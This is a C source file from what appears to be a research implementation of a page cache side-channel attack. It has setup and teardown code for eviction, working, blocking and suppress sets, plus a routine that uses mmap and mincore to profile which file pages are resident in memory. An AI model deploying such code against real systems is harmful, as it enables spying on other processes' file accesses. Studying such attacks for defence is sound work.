#include "pca.h"


/*-----------------------------------------------------------------------------
 * HELPER FUNCTIONS FOR CUSTOM DATATYPES
 */
void initCachedFile(CachedFile *cached_file)
{
    memset(cached_file, 0, sizeof(CachedFile));
    initFileMapping(&cached_file->mapping_);
    // do not waste memory at initialization
    // can not fail because no memory is reserved
    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
}


void closeCachedFile(void *arg)
{
    CachedFile *cached_file = arg;

    if (cached_file->addr_ != MAP_FAILED && cached_file->addr_ != NULL)
    {
        munmap(cached_file->addr_, cached_file->size_);
        cached_file->addr_ = MAP_FAILED;
    }
    if (cached_file->fd_ >= 0)
    {
        close(cached_file->fd_);
        cached_file->fd_ = -1;
    }
    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}


void closeCachedFileArrayFreeOnly(void *arg)
{
    CachedFile *cached_file = arg;

    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
}


void initFillUpProcess(FillUpProcess *fp)
{
    memset(fp, 0, sizeof(FillUpProcess));
    fp->pid_ = -1;
}


void closeFillUpProcess(void *arg)
{
    FillUpProcess *fp = arg;

    // TODO what do to here??
    if (fp->pid_ != 0)
    {
        osal_process_kill(fp->pid_);
    }
    fp->pid_ = 0;
}


void closeThread(void *arg)
{
    pthread_t *thread = arg;

    pthread_join(*thread, NULL);
}


int initAttackEvictionSet(AttackEvictionSet *es)
{
    memset(es, 0, sizeof(AttackEvictionSet));
    initFileMapping(&es->mapping_);
    // only used if ES_USE_THREADS is defined
    if(sem_init(&es->worker_start_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(sem_init(&es->worker_join_sem_, 0, 0) != 0)
    {
        return -1;
    }
    if(!dynArrayInit(&es->access_threads_, sizeof(PageAccessThreadESData), ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}


void closeAttackEvictionSet(AttackEvictionSet *es)
{
    // only used if ES_USE_THREADS is defined
    dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
    sem_destroy(&es->worker_start_sem_);
    sem_destroy(&es->worker_join_sem_);
    //-------------------------------------------------------------------------
     closeFileMapping(&(es->mapping_));
}


int initAttackWorkingSet(AttackWorkingSet *ws)
{
    memset(ws, 0, sizeof(AttackWorkingSet));
    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), ARRAY_INIT_CAP))
    {
        return -1;
    }
    listInit(&ws->resident_files_, sizeof(CachedFile));
    listInit(&ws->non_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_resident_files_, sizeof(CachedFile));
    listInit(&ws->tmp_non_resident_files_, sizeof(CachedFile));

    return 0;
}


void closeAttackWorkingSet(AttackWorkingSet *ws)
{
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
    listDestroy(&ws->resident_files_, closeCachedFile);
    listDestroy(&ws->non_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_resident_files_, closeCachedFile);
    listDestroy(&ws->tmp_non_resident_files_, closeCachedFile);
}


int initAttackBlockingSet(AttackBlockingSet *bs)
{
    memset(bs, 0, sizeof(AttackBlockingSet));
    if (!dynArrayInit(&bs->fillup_processes_, sizeof(FillUpProcess), ARRAY_INIT_CAP))
    {
        return -1;
    }
    if (sem_init(&bs->initialized_sem_, 0, 0) != 0)
    {
        return -1;
    }

    return 0;
}


void closeAttackBlockingSet(AttackBlockingSet *bs)
{
    dynArrayDestroy(&bs->fillup_processes_, closeFillUpProcess);
    sem_destroy(&bs->initialized_sem_);
}


int initAttackSuppressSet(AttackSuppressSet *ss)
{
    memset(ss, 0, sizeof(AttackSuppressSet));
    if (!dynArrayInit(&ss->target_readahead_window_, sizeof(void *), ARRAY_INIT_CAP))
    {
        return -1;
    }

    return 0;
}


void closeAttackSuppressSet(AttackSuppressSet *ss)
{
    dynArrayDestroy(&ss->target_readahead_window_, NULL);
}


void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
{
    memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
}


void closePageAccessThreadESData(void *arg)
{
    PageAccessThreadESData *page_access_thread_es_data = arg;
    // ensures thread stops when currently inside sem_wait
    pthread_cancel(page_access_thread_es_data->tid_);
    pthread_join(page_access_thread_es_data->tid_, NULL);
}


void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
{
    memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
    pthread_mutex_init(&page_access_thread_ws_data->resident_files_lock_, NULL);
}


void closePageAccessThreadWSData(void *arg)
{
    PageAccessThreadWSData *page_access_thread_ws_data = arg;

    if (page_access_thread_ws_data->running_)
    {
        __atomic_store_n(&page_access_thread_ws_data->running_, 0, __ATOMIC_RELAXED);
        pthread_join(page_access_thread_ws_data->tid_, NULL);
        pthread_attr_destroy(&page_access_thread_ws_data->thread_attr_);
    }
}


int initAttack(Attack *attack)
{
    memset(attack, 0, sizeof(Attack));

    if (initAttackEvictionSet(&attack->eviction_set_) != 0)
    {
        return -1;
    }

    if (initAttackWorkingSet(&attack->working_set_) != 0)
    {
        return -1;
    }

    if (initAttackBlockingSet(&attack->blocking_set_) != 0)
    {
        return -1;
    }

    initFileMapping(&attack->target_obj_);

    if (initAttackSuppressSet(&attack->suppress_set_) != 0)
    {
        return -1;
    }

    if (!dynArrayInit(&attack->ss_threads_, sizeof(pthread_t), ARRAY_INIT_CAP))
    {
        return -1;
    }

    initFileMapping(&attack->event_obj_);

    return 0;
}


void exitAttack(Attack *attack)
{
    // join all threads and kill all processes
    if (attack->event_child_ != 0)
    {
        kill(attack->event_child_, SIGKILL);
    }
    dynArrayDestroy(&attack->ss_threads_, closeThread);
    pthread_join(attack->bs_manager_thread_, NULL);
    closeAttackBlockingSet(&attack->blocking_set_);
    pthread_join(attack->ws_manager_thread_, NULL);

    // in reverse close remaining files, unmap and free memory
    closeAttackSuppressSet(&attack->suppress_set_);
    closeAttackWorkingSet(&attack->working_set_);
    closeAttackEvictionSet(&attack->eviction_set_);
    closeFileMapping(&attack->target_obj_);
    closeFileMapping(&attack->event_obj_);
}


/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK
 */
void pcaConfigureFromDefines(Attack *attack)
{
    attack->use_attack_ws_ |= DEF_USE_ATTACK_WS;
    attack->use_attack_bs_ |= DEF_USE_ATTACK_BS;
    attack->mlock_self_ |= DEF_MLOCK_SELF;

    // only used if ES_USE_THREADS is defined
    attack->eviction_set_.access_thread_count_ = DEF_ES_ACCESS_THREAD_COUNT;
    attack->eviction_set_.access_threads_per_pu_ = DEF_ES_ACCESS_THREADS_PER_PU;

    attack->working_set_.evaluation_ |= DEF_WS_EVALUATION;
    attack->working_set_.eviction_ignore_evaluation_ |= DEF_WS_EVICTION_IGNORE_EVALUATION;
    attack->working_set_.search_paths_ = DEF_WS_SEARCH_PATHS;
    attack->working_set_.ps_add_threshold_ = DEF_WS_PS_ADD_THRESHOLD;
    attack->working_set_.access_thread_count_ = DEF_WS_ACCESS_THREAD_COUNT;
    attack->working_set_.access_threads_per_pu_ = DEF_WS_ACCESS_THREADS_PER_PU;
    attack->working_set_.access_sleep_time_.tv_sec = DEF_WS_ACCESS_SLEEP_TIME_S;
    attack->working_set_.access_sleep_time_.tv_nsec = DEF_WS_ACCESS_SLEEP_TIME_NS;
    attack->working_set_.evaluation_sleep_time_.tv_sec = DEF_WS_EVALUATION_SLEEP_TIME_S;
    attack->working_set_.evaluation_sleep_time_.tv_nsec = DEF_WS_EVALUATION_SLEEP_TIME_NS;
    attack->working_set_.profile_update_all_x_evaluations_ = DEF_WS_PROFILE_UPDATE_ALL_X_EVALUATIONS;

    attack->mincore_check_all_x_bytes_ = DEF_MINCORE_CHECK_ALL_X_BYTES;

    attack->blocking_set_.meminfo_file_path_ = DEF_BS_MEMINFO_FILE_PATH;
    attack->blocking_set_.def_fillup_size_ = DEF_BS_FILLUP_SIZE;
    attack->blocking_set_.min_available_mem_ = DEF_BS_MIN_AVAILABLE_MEM;
    attack->blocking_set_.max_available_mem_ = DEF_BS_MAX_AVAILABLE_MEM;
    attack->blocking_set_.evaluation_sleep_time_.tv_sec = DEF_BS_EVALUATION_SLEEP_TIME_S;
    attack->blocking_set_.evaluation_sleep_time_.tv_nsec = DEF_BS_EVALUATION_SLEEP_TIME_NS;

    attack->ss_thread_count_ = DEF_SS_THREAD_COUNT;

    attack->sample_wait_time_.tv_sec = 0;
    attack->sample_wait_time_.tv_nsec = DEF_SAMPLE_WAIT_TIME_NS;
    attack->event_wait_time_.tv_sec = 0;
    attack->event_wait_time_.tv_nsec = DEF_EVENT_WAIT_TIME_NS;
}

#ifdef __linux

int profileAttackWorkingSet(AttackWorkingSet *ws, char *target_obj_path, char *eviction_file_path)
{
    FTS *fts_handle = NULL;
    FTSENT *current_ftsent = NULL;
    // init so that closing works, but without reserving
    CachedFile current_cached_file;
    size_t checked_files = 0;
    size_t memory_checked = 0;
    size_t mem_in_ws = 0;
    int ret = 0;

    // can not fail
    initCachedFile(&current_cached_file);

    // use fts to traverse over all files in the searchpath
    fts_handle = fts_open(ws->search_paths_, FTS_PHYSICAL, NULL);
    if (fts_handle == NULL)
    {
        printf(FAIL "Error (%s) at fts_open...\n", strerror(errno));
        return -1;
    }

    while (running)
    {
        current_ftsent = fts_read(fts_handle);
        // error at traversing files
        if (current_ftsent == NULL && errno)
        {
            // catch too many open files error (end gracefully)
            if (errno == EMFILE)
            {
                printf(WARNING "Too many open files at fts_read, ignoring rest of files...\n");
                break;
            }

            DEBUG_PRINT((DEBUG "Error (%s) at fts_read...\n", strerror(errno)));
            goto error;
        }
        // end
        else if (current_ftsent == NULL)
        {
            break;
        }

        // regular file
        if (current_ftsent->fts_info == FTS_F)
        {
            DEBUG_PRINT((DEBUG "Found possible shared object: %s\n", current_ftsent->fts_path));

            // TODO do not ignore the whole target file (might be big)
            // TODO (but rather just ignore pages other than in the readaheasd window of the target) 
            // !strcmp(current_ftsent->fts_path, target_obj_path
            // check if the found file matches the eviction file or the target and skip if so
            if (!strcmp(current_ftsent->fts_path, eviction_file_path))
            {
                DEBUG_PRINT((DEBUG "Shared object %s is the eviction file or target, skipping...\n", current_ftsent->fts_name));
                continue;
            }

            // check if file is not empty, otherwise skip
            if (current_ftsent->fts_statp->st_size == 0)
            {
                DEBUG_PRINT((DEBUG "File %s has zero size skipping...\n", current_ftsent->fts_name));
                continue;
            }

            // prepare cached file object
            initCachedFile(&current_cached_file);
            // open file, do not update access time (faster), skip in case of errors            
            if (mapFile(&current_cached_file.mapping_, current_ftsent->fts_accpath, FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_SHARED) < 0)
            {
                DEBUG_PRINT((DEBUG "Error (%s) at mapping of file: %s...\n", strerror(errno),
                             current_ftsent->fts_accpath));
                closeCachedFile(&current_cached_file);
                continue;
            }
            // advise random access to avoid readahead (we dont want to change the working set)
            adviseFileUsage(&current_cached_file.mapping_, 0, 0, FILE_USAGE_RANDOM);

            // parse page sequences, skip in case of errors
            if (profileResidentPageSequences(&current_cached_file, ws->ps_add_threshold_) < 0)
            {
                printf(WARNING "Error at profileResidentPageSequences: %s...\n", current_ftsent->fts_accpath);
                closeCachedFile(&current_cached_file);
                continue;
            }

            // no page sequences -> close object
            if (current_cached_file.resident_page_sequences_.size_ == 0)
            {
                closeCachedFile(&current_cached_file);
            }
            // else add current cached file to cached files
            else
            {
                // skip in case of errors
                if (!listAppendBack(&ws->resident_files_, &current_cached_file))
                {
                    closeCachedFile(&current_cached_file);
                    continue;
                }
            }

            checked_files++;
            memory_checked += current_cached_file.size_;
            mem_in_ws += current_cached_file.resident_memory_;
        }
    }
            
    ws->mem_in_ws_ = mem_in_ws;
    DEBUG_PRINT((DEBUG "Finished profiling loaded shared objects (%zu files checked, checked data %zu kB, used as working set %zu kB)!\n",
                 checked_files, memory_checked / 1024, mem_in_ws / 1024));

    goto cleanup;

error:
    ret = -1;
    listDestroy(&ws->resident_files_, closeCachedFile);
    closeCachedFile(&current_cached_file);

cleanup:
    fts_close(fts_handle);

    return ret;
}


int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
{
    int ret = 0;
    unsigned char *page_status = NULL;
    PageSequence sequence = {0};

    // reset array size to zero
    dynArrayReset(&current_cached_file->resident_page_sequences_);
    // reset resident memory
    current_cached_file->resident_memory_ = 0;

    // mmap file if not already mapped
    if (current_cached_file->addr_ == MAP_FAILED)
    {
        current_cached_file->addr_ =
            mmap(NULL, current_cached_file->size_, PROT_READ | PROT_EXEC, MAP_PRIVATE, current_cached_file->fd_, 0);
        if (current_cached_file->addr_ == MAP_FAILED)
        {
            DEBUG_PRINT((DEBUG "Error (%s) at mmap...\n", strerror(errno)));
            goto error;
        }
    }
    // advise random access to avoid readahead (we dont want to change the working set)
    madvise(current_cached_file->addr_, current_cached_file->size_, MADV_RANDOM);

    // get status of the file pages
    page_status = malloc(current_cached_file->size_pages_);
    if (page_status == NULL)
    {
        DEBUG_PRINT((DEBUG "Error (%s) at malloc...\n", strerror(errno)));
        goto error;
    }
    if (mincore(current_cached_file->addr_, current_cached_file->size_, page_status) != 0)
    {
        DEBUG_PRINT((DEBUG "Error (%s) at mincore...\n", strerror(errno)));
        goto error;
    }

    // check for sequences and add them
    for (size_t p = 0; p < current_cached_file->size_pages_; p++)
    {
        if (page_status[p] & 1)
        {
            if (sequence.length_ == 0)
            {
                sequence.offset_ = p;
            }

            sequence.length_++;
        }
        else
        {
            // add sequence if greater equal than threshold
            if (sequence.length_ >= ps_add_threshold)
            {
                // add sequence pages
                if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
                {
                    DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
                    goto error;
                }

                current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
                DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                             sequence.offset_, sequence.length_));
                // reset sequence length
                sequence.length_ = 0;
            }
        }
    }
    // process last found sequence
    if (sequence.length_ >= ps_add_threshold)
    {
        // add sequence pages
        if (!dynArrayAppend(&current_cached_file->resident_page_sequences_, &sequence))
        {
            DEBUG_PRINT((DEBUG "Error at dynArrayAppend...\n"));
            goto error;
        }

        current_cached_file->resident_memory_ += sequence.length_ * PAGE_SIZE;
        DEBUG_PRINT((DEBUG "Added page sequence with page offset %zu and %zu pages\n",
                     sequence.offset_, sequence.length_));
    }

    goto cleanup;

error:

    ret = -1;
    dynArrayDestroy(&current_cached_file->resident_page_sequences_, NULL);
    current_cached_file->resident_memory_ = 0;

cleanup:

#ifdef WS_MAP_FILE
    if (current_cached_file->fd_ > 0)
    {
        close(current_cached_file->fd_);
        current_cached_file->fd_ = -1;
    }
#else
    if (current_cached_file->addr_ != MAP_FAILED)
    {
        munmap(current_cached_file->addr_, current_cached_file->size_);
        current_cached_file->addr_ = MAP_FAILED;
    }
#endif

    free(page_status);
    return ret;
}


int pageSeqCmp(void *node, void *data)
{
    if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
    {
        return 1;
    }

    return 0;
}

#elif defined (_WIN32)

#endif